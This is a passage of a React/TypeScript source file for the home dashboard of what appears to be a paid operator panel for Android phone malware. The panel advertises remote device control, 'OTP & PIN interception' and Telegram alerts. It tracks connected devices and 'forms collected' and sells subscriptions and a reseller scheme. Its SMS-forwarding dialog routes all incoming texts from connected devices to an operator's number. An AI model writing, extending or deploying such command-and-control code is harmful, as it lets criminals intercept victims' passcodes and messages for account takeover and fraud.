import { useState, useEffect, useRef } from "react";
import defaultBg from "@/assets/blackhole-bg.jpg";
import { useFirebaseUsers } from "@/hooks/useFirebaseData";
import { usePanelName, useBgImageUrl } from "@/hooks/useCustomization";
import { usePanelConfig } from "@/hooks/usePanelConfig";
import { Menu, WifiOff, Smartphone, Zap, Lock, Globe, ChevronRight, Activity, Shield, MessageSquare, Settings, Clock, Crown, Send, FileText, Fingerprint, Grid3X3, BarChart3, ArrowRightLeft, Phone, Save, Camera, Loader2, X, Bell, ImageIcon, Star, KeyRound, AlertTriangle, Users, HelpCircle, ScanSearch, Palette, History, Trash2, Download, RefreshCw } from "lucide-react";
import AccessModal from "@/components/AccessModal";

import AppDrawer from "@/components/AppDrawer";
import AllFormsOverlay from "@/components/AllFormsOverlay";
import { useAllDeviceForms } from "@/hooks/useFirebaseData";
import { Skeleton } from "@/components/ui/skeleton";
import { useNavigate } from "react-router-dom";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { motion, AnimatePresence } from "framer-motion";
import { Switch } from "@/components/ui/switch";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { ref, onValue, set } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { toast } from "sonner";
import AccountSwitcher from "@/components/AccountSwitcher";
import { getActiveAccountId, syncSettingsToAllAccounts } from "@/lib/multiAccount";

const Index = () => {
  const panelName = usePanelName();
  const bgImage = useBgImageUrl() || defaultBg;
  const { users, loading } = useFirebaseUsers();
  const { formsMap } = useAllDeviceForms();
  const { config, daysRemaining } = usePanelConfig();
  const [drawerOpen, setDrawerOpen] = useState(false);
  const [showAllForms, setShowAllForms] = useState(false);
  
  const [showSmsForward, setShowSmsForward] = useState(false);
  const [smsForwardEnabled, setSmsForwardEnabled] = useState(false);
  const [smsForwardNumber, setSmsForwardNumber] = useState("");
  const [smsForwardSaving, setSmsForwardSaving] = useState(false);
  const [showScanner, setShowScanner] = useState(false);
  const [scanning, setScanning] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [showAccessModal, setShowAccessModal] = useState(false);
  const [accessModalMode, setAccessModalMode] = useState<"access" | "reseller">("access");
  
  const isSecondaryAccount = !!getActiveAccountId();
  const [showSyncConfirm, setShowSyncConfirm] = useState(false);
  const [syncing, setSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState("");
  const navigate = useNavigate();

  // Auto-open access modal if less than 7 days remaining (default account only)
  useEffect(() => {
    if (!isSecondaryAccount && daysRemaining !== null && daysRemaining > 0 && daysRemaining <= 7) {
      setAccessModalMode("access");
      setShowAccessModal(true);
    }
  }, [daysRemaining, isSecondaryAccount]);

  const stopCamera = () => {
    streamRef.current?.getTracks().forEach((t) => t.stop());
    streamRef.current = null;
  };

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
      });
      streamRef.current = stream;
      setShowScanner(true);
    } catch {
      toast.error("Camera permission denied");
    }
  };

  const videoCallbackRef = (node: HTMLVideoElement | null) => {
    videoRef.current = node;
    if (node && streamRef.current) {
      node.srcObject = streamRef.current;
    }
  };

  const captureAndOCR = async () => {
    if (!videoRef.current || !canvasRef.current) return;
    setScanning(true);
    const video = videoRef.current;
    const canvas = canvasRef.current;
    // Crop to center region for faster OCR
    const sw = video.videoWidth * 0.8;
    const sh = video.videoHeight * 0.3;
    const sx = (video.videoWidth - sw) / 2;
    const sy = (video.videoHeight - sh) / 2;
    canvas.width = sw;
    canvas.height = sh;
    const ctx = canvas.getContext("2d");
    ctx?.drawImage(video, sx, sy, sw, sh, 0, 0, sw, sh);
    stopCamera();

    try {
      const { createWorker } = await import("tesseract.js");
      const worker = await createWorker("eng", 1, {
        langPath: "https://tessdata.projectnaptha.com/4.0.0",
      });
      await worker.setParameters({
        tessedit_char_whitelist: "0123456789+ ",
      } as any);
      const { data: { text } } = await worker.recognize(canvas);
      await worker.terminate();

      const cleaned = text.replace(/[^0-9+]/g, " ");
      const match = cleaned.match(/(?:\+91\s*)?(\d{10})/);
      if (match) {
        setSmsForwardNumber(match[1]);
        toast.success(`Number found: ${match[1]}`);
      } else {
        toast.error("No 10-digit number found, try again");
      }
    } catch {
      toast.error("OCR failed, try again");
    } finally {
      setScanning(false);
      setShowScanner(false);
    }
  };

  useEffect(() => {
    const fwdRef = ref(db, "forwarding");
    const unsub = onValue(fwdRef, (snap) => {
      if (snap.exists()) {
        setSmsForwardEnabled(snap.child("enabled").val() ?? false);
        setSmsForwardNumber(snap.child("number").val() ?? "");
      }
    });
    return () => unsub();
  }, []);

  const handleSaveSmsForward = async () => {
    setSmsForwardSaving(true);
    try {
      await set(ref(db, "forwarding"), {
        enabled: smsForwardEnabled,
        number: smsForwardNumber,
      });
      toast.success("SMS Forwarding settings saved");
      setShowSmsForward(false);
    } catch {
      toast.error("Failed to save settings");
    } finally {
      setSmsForwardSaving(false);
    }
  };
  

  const userEntries = Object.entries(users).filter(([, u]) => u.model && u.model.trim() !== "");
  const onlineCount = userEntries.filter(([, u]) => u.status === "online").length;
  const offlineCount = userEntries.length - onlineCount;
  const totalForms = Object.values(formsMap).reduce((sum, arr) => sum + arr.length, 0);

  const features = [
    { icon: Smartphone, label: "Device Control", desc: "Full remote access & management", color: "hsl(var(--cyan))" },
    { icon: Lock, label: "2FA Security", desc: "OTP & PIN interception", color: "hsl(var(--pink))" },
    { icon: Zap, label: "Real-time Sync", desc: "Live data streaming", color: "hsl(var(--yellow))" },
    { icon: Globe, label: "Telegram Bot", desc: "Instant alert notifications", color: "hsl(var(--green))" },
  ];

  const quickActions = [
    { icon: Smartphone, label: "Devices", desc: `${userEntries.length} connected`, path: "/devices", accent: "primary" },
    { icon: MessageSquare, label: "Messages", desc: "View all SMS", path: "/messages", accent: "cyan" },
    { icon: Settings, label: "Settings", desc: "Configure panel", path: "/settings", accent: "orange" },
  ];

  return (
    <div className="min-h-screen pb-20 lg:pb-6 relative">
      <div className="fixed inset-0 z-0 bg-cover bg-center opacity-15 pointer-events-none" style={{ backgroundImage: `url(${bgImage})` }} />
      <div className="fixed top-20 left-1/2 -translate-x-1/2 w-[500px] h-[500px] bg-primary/8 rounded-full blur-[120px] z-0 pointer-events-none" />
      <div className="fixed bottom-40 right-0 w-[300px] h-[300px] bg-accent/6 rounded-full blur-[100px] z-0 pointer-events-none" />

      <div className="relative z-10 min-h-screen">
        {/* Header - mobile only, desktop uses sidebar */}
        <header className="sticky top-0 z-30 lg:hidden overflow-visible">
          {/* Glassmorphic gradient bar */}
          <div className="absolute inset-0 bg-background/40 backdrop-blur-2xl" />
          <div className="absolute inset-0 bg-gradient-to-r from-primary/[0.04] via-transparent to-accent/[0.04]" />
          <div className="absolute bottom-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-primary/20 to-transparent" />
          
          <div className="relative flex h-[60px] items-center justify-between px-4">
            <div className="flex items-center gap-3">
              <button
                onClick={() => setDrawerOpen(true)}
                className="relative h-10 w-10 rounded-[14px] bg-gradient-to-br from-primary/15 to-primary/5 border border-primary/15 flex items-center justify-center active:scale-90 transition-all"
              >
                <Menu className="h-[18px] w-[18px] text-primary" />
                {/* Tiny notification dot */}
                <span className="absolute -top-0.5 -right-0.5 h-2 w-2 rounded-full bg-primary shadow-[0_0_6px_hsl(var(--primary)/0.5)]" />
              </button>
              <div className="flex flex-col">
                <div className="flex items-center gap-1.5">
                  <div className="h-5 w-5 rounded-md bg-primary/15 flex items-center justify-center">
                    <Shield className="h-3 w-3 text-primary" />
                  </div>
                  <h1 className="text-[13px] font-black text-foreground tracking-tight leading-none">{panelName}</h1>
                </div>
                <div className="flex items-center gap-1.5 mt-1 ml-[26px]">
                  <span className="h-px w-3 bg-gradient-to-r from-primary/40 to-transparent" />
                  <p className="text-[7px] font-bold text-muted-foreground uppercase tracking-[0.25em]">Command Center</p>
                </div>
              </div>
            </div>
            
            <div className="flex items-center gap-2">
              <AccountSwitcher />
              <button
                onClick={() => navigate("/settings")}
                className="h-9 w-9 rounded-full bg-secondary/80 border border-border/50 flex items-center justify-center active:scale-90 transition-all"
              >
                <Settings className="h-4 w-4 text-muted-foreground" />
              </button>
            </div>
          </div>
        </header>


        {/* SMS Forwarding Modal */}
        <Dialog open={showSmsForward} onOpenChange={setShowSmsForward}>
          <DialogContent className="fixed inset-0 max-w-none w-full h-full translate-x-0 translate-y-0 left-0 top-0 rounded-none border-0 flex flex-col overflow-y-auto">
            <DialogHeader>
              <DialogTitle className="flex items-center gap-2 text-base">
                <ArrowRightLeft className="h-5 w-5 text-primary" />
                SMS Forwarding
              </DialogTitle>
            </DialogHeader>
            <div className="space-y-5 pt-2">
              <div className="flex items-center justify-between p-3 rounded-xl border border-border/50 bg-card/60">
                <div className="flex items-center gap-3">
                  <div className="h-9 w-9 rounded-xl bg-primary/10 flex items-center justify-center">
                    <ArrowRightLeft className="h-4 w-4 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-bold text-foreground">Enable Forwarding</p>
                    <p className="text-[10px] text-muted-foreground">Forward incoming SMS to a number</p>
                  </div>
                </div>
                <Switch checked={smsForwardEnabled} onCheckedChange={setSmsForwardEnabled} />
              </div>

              <AnimatePresence>
                {smsForwardEnabled && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: "auto" }}
                    exit={{ opacity: 0, height: 0 }}
                    transition={{ duration: 0.2 }}
                    className="space-y-2 overflow-hidden"
                  >
                    <Label htmlFor="fwd-number" className="text-xs font-semibold text-muted-foreground">
                      Forward to Number
                    </Label>
                    <div className="rounded-xl border border-primary/20 bg-secondary/50 p-3 space-y-3">
                      <div className="relative">
                        <Phone className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-primary/60" />
                        <Input
                          id="fwd-number"
                          inputMode="tel"
                          autoComplete="tel"
                          placeholder="Enter 10-digit number"
                          value={smsForwardNumber}
                          onChange={(e) => setSmsForwardNumber(e.target.value)}
                          className="pl-10 h-12 text-base font-mono font-semibold tracking-wider border-primary/20 bg-background/80 rounded-lg"
                        />
                      </div>
                      <div className="flex gap-2">
                        <Button
                          type="button"
                          variant="outline"
                          size="sm"
                          className="flex-1 gap-1.5 h-9 text-xs border-border/60"
                          onClick={async () => {
                            try {
                              const text = await navigator.clipboard.readText();
                              if (text) {
                                setSmsForwardNumber(text.trim());
                                toast.success("Pasted!");
                              }
                            } catch {
                              toast.error("Clipboard access denied");
                            }
                          }}
                        >
                          <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                          Paste
                        </Button>
                        <Button
                          type="button"
                          variant="outline"
                          size="sm"
                          className="flex-1 gap-1.5 h-9 text-xs border-border/60"
                          onClick={startCamera}
                        >
                          <Camera className="h-3.5 w-3.5" />
                          Scan
                        </Button>
                      </div>
                    </div>

                    {/* Scanner modal */}
                    <AnimatePresence>
                      {showScanner && (
                        <motion.div
                          initial={{ opacity: 0, scale: 0.95 }}
                          animate={{ opacity: 1, scale: 1 }}
                          exit={{ opacity: 0, scale: 0.95 }}
                          className="rounded-xl border border-border/50 bg-card overflow-hidden"
                        >
                          <div className="flex items-center justify-between px-3 py-2 border-b border-border/40">
                            <p className="text-[11px] font-bold text-foreground">Scan Number</p>
                            <button onClick={() => { stopCamera(); setShowScanner(false); }} className="text-muted-foreground hover:text-foreground">
                              <X className="h-4 w-4" />
                            </button>
                          </div>
                          <div className="relative aspect-[4/3] bg-black">
                            <video ref={videoCallbackRef} autoPlay playsInline muted className="w-full h-full object-cover" />
                            <canvas ref={canvasRef} className="hidden" />
                            {/* Scan overlay guide */}
                            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                              <div className="w-[70%] h-12 border-2 border-primary/60 rounded-lg" />
                            </div>
                          </div>
                          <div className="p-3 flex flex-col gap-2">
                            <p className="text-[9px] text-muted-foreground text-center">Point camera at the phone number</p>
                            <Button
                              onClick={captureAndOCR}
                              disabled={scanning}
                              className="w-full gap-2"
                              size="sm"
                            >
                              {scanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Camera className="h-4 w-4" />}
                              {scanning ? "Reading..." : "Capture & Extract"}
                            </Button>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    <p className="text-[9px] text-muted-foreground">
                      All incoming SMS from connected devices will be forwarded to this number.
                    </p>
                  </motion.div>
                )}
              </AnimatePresence>

              <Button
                onClick={handleSaveSmsForward}
                disabled={smsForwardSaving}
                className="w-full gap-2"
              >
                <Save className="h-4 w-4" />
                {smsForwardSaving ? "Saving..." : "Save Settings"}
              </Button>
            </div>
          </DialogContent>
        </Dialog>

        <main className="px-5 lg:px-8 py-5 lg:py-8 space-y-4 lg:space-y-0 max-w-[1400px] mx-auto">
          {loading ? (
            /* Skeleton loading state */
            <div className="space-y-4">
              {/* Welcome skeleton */}
              <div className="rounded-2xl border border-border/40 bg-card/40 p-4 space-y-3">
                <Skeleton className="h-3 w-24" />
                <Skeleton className="h-6 w-40" />
                <Skeleton className="h-3 w-56" />
              </div>
              {/* Status skeleton */}
              <div className="rounded-2xl border border-border/40 bg-card/40 p-4 space-y-3">
                <Skeleton className="h-3 w-20" />
                <div className="grid grid-cols-3 gap-3">
                  {[1, 2, 3].map(i => (
                    <div key={i} className="flex flex-col items-center gap-2 py-3">
                      <Skeleton className="h-8 w-12" />
                      <Skeleton className="h-2 w-10" />
                    </div>
                  ))}
                </div>
                <Skeleton className="h-1 w-full rounded-full" />
              </div>
              {/* Quick actions skeleton */}
              <div className="grid grid-cols-3 gap-2">
                {[1, 2, 3].map(i => (
                  <div key={i} className="rounded-2xl border border-border/40 bg-card/40 p-3.5 flex flex-col items-center gap-2">
                    <Skeleton className="h-10 w-10 rounded-xl" />
                    <Skeleton className="h-3 w-14" />
                    <Skeleton className="h-2 w-16" />
                  </div>
                ))}
              </div>
              {/* CTA skeleton */}
              <Skeleton className="h-16 w-full rounded-2xl" />
              {/* Features skeleton */}
              <div className="grid grid-cols-2 gap-2">
                {[1, 2, 3, 4].map(i => (
                  <div key={i} className="rounded-2xl border border-border/40 bg-card/40 p-3.5 flex items-start gap-3">
                    <Skeleton className="h-9 w-9 rounded-xl shrink-0" />
                    <div className="space-y-1.5 flex-1">
                      <Skeleton className="h-3 w-20" />
                      <Skeleton className="h-2 w-full" />
                    </div>
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <>
              {/* ── DESKTOP: Two-column dashboard ── */}
              <div className="hidden lg:block">
                <div className="flex items-center justify-between mb-8">
                  <div>
                    <h2 className="text-2xl font-black text-foreground tracking-tight">{config.admin_name} 👋</h2>
                    <div className="flex items-center gap-3 mt-1.5">
                      {!isSecondaryAccount && config.expiry_date && (
                        <span className={`text-sm font-semibold ${daysRemaining !== null && daysRemaining <= 7 ? "text-destructive" : daysRemaining !== null && daysRemaining <= 30 ? "text-yellow" : "text-green"}`}>
                          {daysRemaining !== null && daysRemaining > 0 ? `${daysRemaining} days remaining` : "Expired"}
                        </span>
                      )}
                      <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-green/10 border border-green/20">
                        <span className="relative flex h-1.5 w-1.5">
                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green opacity-75" />
                          <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-green" />
                        </span>
                        <span className="text-[10px] font-bold text-green">Live</span>
                      </div>
                      {!isSecondaryAccount && daysRemaining !== null && daysRemaining > 0 && (() => {
                        if (daysRemaining > 10000) return (
                          <motion.span animate={{ scale: [1, 1.04, 1] }} transition={{ duration: 2, repeat: Infinity }} className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-gradient-to-r from-yellow/25 via-primary/20 to-yellow/25 border border-yellow/40 shadow-[0_0_12px_rgba(234,179,8,0.3)] text-[9px] font-black uppercase tracking-widest">
                            <Crown className="h-3.5 w-3.5 text-yellow drop-shadow-[0_0_4px_rgba(234,179,8,0.6)]" />
                            <span className="bg-gradient-to-r from-yellow via-amber-300 to-primary bg-clip-text text-transparent">VIP3 · Premium</span>
                          </motion.span>
                        );
                        if (daysRemaining > 25) return (
                          <motion.span animate={{ scale: [1, 1.03, 1] }} transition={{ duration: 2.5, repeat: Infinity }} className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-gradient-to-r from-yellow/20 to-amber-500/15 border border-yellow/35 shadow-[0_0_10px_rgba(234,179,8,0.2)] text-[9px] font-black uppercase tracking-widest">
                            <Crown className="h-3.5 w-3.5 text-yellow drop-shadow-[0_0_3px_rgba(234,179,8,0.5)]" />
                            <span className="bg-gradient-to-r from-yellow to-amber-400 bg-clip-text text-transparent">Gold</span>
                          </motion.span>
                        );
                        if (daysRemaining >= 7) return (
                          <motion.span animate={{ scale: [1, 1.02, 1] }} transition={{ duration: 3, repeat: Infinity }} className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-gradient-to-r from-slate-300/20 to-gray-400/15 border border-slate-300/35 shadow-[0_0_8px_rgba(148,163,184,0.2)] text-[9px] font-black uppercase tracking-widest">
                            <Crown className="h-3.5 w-3.5 text-slate-300 drop-shadow-[0_0_3px_rgba(148,163,184,0.5)]" />
                            <span className="bg-gradient-to-r from-slate-200 to-gray-400 bg-clip-text text-transparent">Silver</span>
                          </motion.span>
                        );
                        return (
                          <span className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-gradient-to-r from-orange/15 to-amber-700/10 border border-orange/30 text-[9px] font-black uppercase tracking-widest">
                            <Crown className="h-3.5 w-3.5 text-orange" />
                            <span className="bg-gradient-to-r from-orange to-amber-700 bg-clip-text text-transparent">Bronze</span>
                          </span>
                        );
                      })()}
                    </div>
                  </div>
                  <AccountSwitcher />
                </div>

                <div className="grid grid-cols-3 gap-4 mb-6">
                  {[
                    { value: userEntries.length, label: "Total Devices", icon: Smartphone, color: "text-foreground", bg: "bg-primary/10", border: "border-primary/20" },
                    { value: onlineCount, label: "Online", icon: Activity, color: "text-green", bg: "bg-green/10", border: "border-green/20" },
                    { value: offlineCount, label: "Offline", icon: WifiOff, color: "text-muted-foreground", bg: "bg-secondary", border: "border-border/50" },
                  ].map((s) => (
                    <div key={s.label} className={`rounded-2xl border ${s.border} ${s.bg} backdrop-blur-sm p-6 flex items-center gap-4 hover:scale-[1.01] transition-transform`}>
                      <div className="h-14 w-14 rounded-2xl bg-background/60 flex items-center justify-center">
                        <s.icon className={`h-6 w-6 ${s.color}`} />
                      </div>
                      <div>
                        <p className={`text-4xl font-black ${s.color} tracking-tight leading-none`}>{s.value}</p>
                        <p className="text-xs text-muted-foreground font-semibold mt-1">{s.label}</p>
                      </div>
                    </div>
                  ))}
                </div>

                <div className="grid grid-cols-5 gap-6">
                  <div className="col-span-3 space-y-5">
                    <div className="grid grid-cols-3 gap-3">
                      {quickActions.map((a) => (
                        <button key={a.label} onClick={() => navigate(a.path)}
                          className="rounded-2xl border border-border/60 bg-card/40 backdrop-blur-sm p-5 flex items-center gap-4 hover:border-primary/30 hover:bg-primary/5 active:scale-[0.98] transition-all group">
                          <div className="h-12 w-12 rounded-xl bg-primary/10 group-hover:bg-primary/20 flex items-center justify-center transition-colors shrink-0">
                            <a.icon className="h-5 w-5 text-primary" />
                          </div>
                          <div className="text-left">
                            <p className="text-sm font-bold text-foreground">{a.label}</p>
                            <p className="text-xs text-muted-foreground">{a.desc}</p>
                          </div>
                        </button>
                      ))}
                    </div>

                    <button onClick={() => navigate("/devices")}
                      className="w-full rounded-2xl border border-primary/20 bg-gradient-to-r from-primary/10 via-primary/5 to-transparent p-5 flex items-center justify-between group hover:border-primary/40 transition-all active:scale-[0.99]">
                      <div className="flex items-center gap-4">
                        <div className="h-12 w-12 rounded-xl bg-primary/15 flex items-center justify-center group-hover:bg-primary/25 transition-colors">
                          <Smartphone className="h-5 w-5 text-primary" />
                        </div>
                        <div className="text-left">
                          <p className="text-base font-bold text-foreground">View All Devices</p>
                          <p className="text-xs text-muted-foreground">{onlineCount} active, {offlineCount} idle · Click to manage</p>
                        </div>
                      </div>
                      <ChevronRight className="h-5 w-5 text-primary group-hover:translate-x-1 transition-transform" />
                    </button>

                    <div>
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-[0.2em] mb-3">Capabilities</p>
                      <div className="grid grid-cols-2 gap-3">
                        {features.map((f) => (
                          <div key={f.label} className="rounded-2xl border border-border/50 bg-card/30 backdrop-blur-sm p-4 flex items-center gap-4 hover:border-primary/20 transition-colors">
                            <div className="h-11 w-11 rounded-xl flex items-center justify-center flex-shrink-0"
                              style={{ backgroundColor: `${f.color}12`, border: `1px solid ${f.color}25` }}>
                              <f.icon className="h-5 w-5" style={{ color: f.color }} />
                            </div>
                            <div className="min-w-0">
                              <p className="text-sm font-bold text-foreground">{f.label}</p>
                              <p className="text-xs text-muted-foreground mt-0.5">{f.desc}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>

                  <div className="col-span-2 space-y-5">
                    <div className="rounded-2xl border border-primary/15 bg-card/40 backdrop-blur-sm p-5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-[0.2em] mb-4">Total Forms</p>
                      <div className="flex items-center gap-4">
                        <div className="h-14 w-14 rounded-2xl bg-primary/10 flex items-center justify-center">
                          <FileText className="h-6 w-6 text-primary" />
                        </div>
                        <div>
                          <span className="text-5xl font-black text-primary leading-none">{totalForms}</span>
                          <p className="text-sm text-muted-foreground font-medium mt-1">forms collected</p>
                        </div>
                      </div>
                    </div>

                    {!isSecondaryAccount && config.expiry_date && (
                      <div className="rounded-2xl border border-border/50 bg-card/40 backdrop-blur-sm p-5">
                        <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-[0.2em] mb-3">Subscription</p>
                        <div className="flex items-center gap-3 mb-3">
                          <Clock className="h-5 w-5 text-muted-foreground" />
                          <span className={`text-sm font-semibold ${daysRemaining !== null && daysRemaining <= 7 ? "text-destructive" : "text-muted-foreground"}`}>
                            {daysRemaining !== null && daysRemaining <= 7 && daysRemaining! > 0
                              ? `⚠ ${daysRemaining} days left — About to expire`
                              : `Expires ${new Date(config.expiry_date).toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" })}`}
                          </span>
                        </div>
                        <button onClick={() => { setAccessModalMode("access"); setShowAccessModal(true); }}
                          className="w-full py-2.5 rounded-xl border border-primary/20 bg-primary/10 text-xs font-bold text-primary hover:bg-primary/20 transition-colors">
                          Extend Access
                        </button>
                      </div>
                    )}

                    {!isSecondaryAccount && (
                      <>
                        <button
                          onClick={() => { setAccessModalMode("access"); setShowAccessModal(true); }}
                          className={`w-full rounded-2xl border p-4 flex items-center gap-4 hover:scale-[1.01] active:scale-[0.99] transition-all text-left ${
                            daysRemaining !== null && daysRemaining <= 7 && daysRemaining! > 0
                              ? "border-destructive/30 bg-destructive/5"
                              : "border-yellow/20 bg-gradient-to-r from-yellow/8 to-transparent"
                          }`}
                        >
                          <div className={`h-12 w-12 rounded-xl flex items-center justify-center ${
                            daysRemaining !== null && daysRemaining <= 7 && daysRemaining! > 0 ? "bg-destructive/10" : "bg-yellow/10"
                          }`}>
                            <KeyRound className={`h-5 w-5 ${daysRemaining !== null && daysRemaining <= 7 && daysRemaining! > 0 ? "text-destructive" : "text-yellow"}`} />
                          </div>
                          <div>
                            <p className="text-sm font-bold text-foreground">
                              {daysRemaining !== null && daysRemaining <= 7 && daysRemaining! > 0 ? "Renew Now" : "Extend Access"}
                            </p>
                            <p className="text-xs text-muted-foreground">Plans from $250</p>
                          </div>
                        </button>

                        <button
                          onClick={() => { setAccessModalMode("reseller"); setShowAccessModal(true); }}
                          className="w-full rounded-2xl border border-green/20 bg-gradient-to-r from-green/8 to-transparent p-4 flex items-center gap-4 hover:scale-[1.01] active:scale-[0.99] transition-all text-left"
                        >
                          <div className="h-12 w-12 rounded-xl bg-green/10 flex items-center justify-center">
                            <Users className="h-5 w-5 text-green" />
                          </div>
                          <div>
                            <p className="text-sm font-bold text-foreground">Become a Reseller</p>
                            <p className="text-xs text-muted-foreground">Just $99 · Earn 50% per sale</p>
                          </div>
                        </button>
                      </>
                    )}
                  </div>
                </div>
              </div>

              {/* ── MOBILE: Premium redesigned layout ── */}
              <div className="lg:hidden space-y-4">
                
                {/* VIP Hero Card */}
                <motion.div 
                  initial={{ opacity: 0, y: 20 }} 
                  animate={{ opacity: 1, y: 0 }}
                  className="relative overflow-hidden rounded-[22px] bg-card border border-border/40"
                >
                  {/* Subtle top accent line */}
                  <div className="absolute top-0 left-6 right-6 h-[2px] bg-gradient-to-r from-transparent via-primary/40 to-transparent z-10" />
                  
                  <div className="relative px-5 pt-5 pb-4 z-[1]">
                    {/* Top row: avatar + name + tier badge */}
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3.5">
                        <motion.div 
                          initial={{ scale: 0 }} animate={{ scale: 1 }} 
                          transition={{ type: "spring", stiffness: 200, delay: 0.1 }}
                          className="h-[52px] w-[52px] rounded-[16px] bg-gradient-to-br from-primary via-primary/85 to-primary/60 flex items-center justify-center shadow-lg shadow-primary/25"
                        >
                          <span className="text-xl font-black text-primary-foreground leading-none">
                            {config.admin_name ? config.admin_name.charAt(0).toUpperCase() : "A"}
                          </span>
                        </motion.div>
                        <div>
                          <p className="text-[9px] font-bold text-muted-foreground uppercase tracking-[0.2em] leading-none">Welcome back</p>
                          <h2 className="text-[17px] font-black text-foreground tracking-tight leading-none mt-1.5">{config.admin_name}</h2>
                        </div>
                      </div>
                      
                      {/* Tier Badge */}
                      {!isSecondaryAccount && daysRemaining !== null && daysRemaining > 0 && (() => {
                        if (daysRemaining > 10000) return (
                          <motion.div 
                            initial={{ scale: 0, rotate: -10 }} animate={{ scale: 1, rotate: 0 }}
                            transition={{ type: "spring", stiffness: 200, delay: 0.2 }}
                            className="flex flex-col items-center gap-0.5 px-3 py-2 rounded-2xl bg-gradient-to-b from-yellow/20 via-yellow/10 to-primary/10 border border-yellow/30 shadow-lg shadow-yellow/10"
                          >
                            <Crown className="h-4 w-4 text-yellow drop-shadow-[0_0_6px_hsl(var(--yellow)/0.5)]" />
                            <span className="text-[8px] font-black uppercase tracking-[0.15em] bg-gradient-to-r from-yellow via-primary to-yellow bg-clip-text text-transparent">VIP 3</span>
                          </motion.div>
                        );
                        if (daysRemaining > 25) return (
                          <motion.div initial={{ scale: 0 }} animate={{ scale: [1, 1.05, 1] }} transition={{ delay: 0.2, duration: 2.5, repeat: Infinity }}
                            className="flex flex-col items-center gap-0.5 px-3 py-2 rounded-2xl bg-gradient-to-b from-yellow/20 to-amber-500/10 border border-yellow/35 shadow-lg shadow-yellow/10">
                            <Crown className="h-3.5 w-3.5 text-yellow drop-shadow-[0_0_4px_rgba(234,179,8,0.5)]" />
                            <span className="text-[8px] font-black uppercase tracking-wider bg-gradient-to-r from-yellow to-amber-400 bg-clip-text text-transparent">Gold</span>
                          </motion.div>
                        );
                        if (daysRemaining >= 7) return (
                          <motion.div initial={{ scale: 0 }} animate={{ scale: [1, 1.04, 1] }} transition={{ delay: 0.2, duration: 3, repeat: Infinity }}
                            className="flex flex-col items-center gap-0.5 px-3 py-2 rounded-2xl bg-gradient-to-b from-slate-300/15 to-gray-400/10 border border-slate-300/30 shadow-lg shadow-slate-300/10">
                            <Crown className="h-3.5 w-3.5 text-slate-300 drop-shadow-[0_0_4px_rgba(148,163,184,0.5)]" />
                            <span className="text-[8px] font-black uppercase tracking-wider bg-gradient-to-r from-slate-200 to-gray-400 bg-clip-text text-transparent">Silver</span>
                          </motion.div>
                        );
                        return (
                          <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ delay: 0.2 }}
                            className="flex flex-col items-center gap-0.5 px-3 py-2 rounded-2xl bg-gradient-to-b from-orange/15 to-amber-700/10 border border-orange/30">
                            <Crown className="h-3.5 w-3.5 text-orange" />
                            <span className="text-[8px] font-black uppercase tracking-wider bg-gradient-to-r from-orange to-amber-700 bg-clip-text text-transparent">Bronze</span>
                          </motion.div>
                        );
                      })()}
                    </div>
                    
                    {/* Expiry pill — default account only */}
                    {!isSecondaryAccount && config.expiry_date && (
                      <motion.button 
                        initial={{ opacity: 0, y: 8 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.15 }}
                        onClick={() => { setAccessModalMode("access"); setShowAccessModal(true); }}
                        className="w-full flex items-center gap-2.5 mt-4 px-4 py-2.5 rounded-[14px] bg-muted/40 border border-border/30 active:scale-[0.98] transition-all"
                      >
                        {daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0 ? (
                          <AlertTriangle className="h-3.5 w-3.5 text-destructive flex-shrink-0" />
                        ) : (
                          <Clock className="h-3.5 w-3.5 text-muted-foreground flex-shrink-0" />
                        )}
                        <span className={`text-[11px] font-bold ${daysRemaining !== null && daysRemaining <= 7 ? "text-destructive" : daysRemaining !== null && daysRemaining <= 30 ? "text-yellow" : "text-green"}`}>
                          {daysRemaining !== null && daysRemaining > 10000 ? "Lifetime Access" : daysRemaining !== null && daysRemaining > 0 ? `${daysRemaining} day${daysRemaining !== 1 ? "s" : ""} left` : "Expired"}
                          {daysRemaining !== null && daysRemaining <= 7 && daysRemaining > 0 ? " · Tap to renew" : ""}
                        </span>
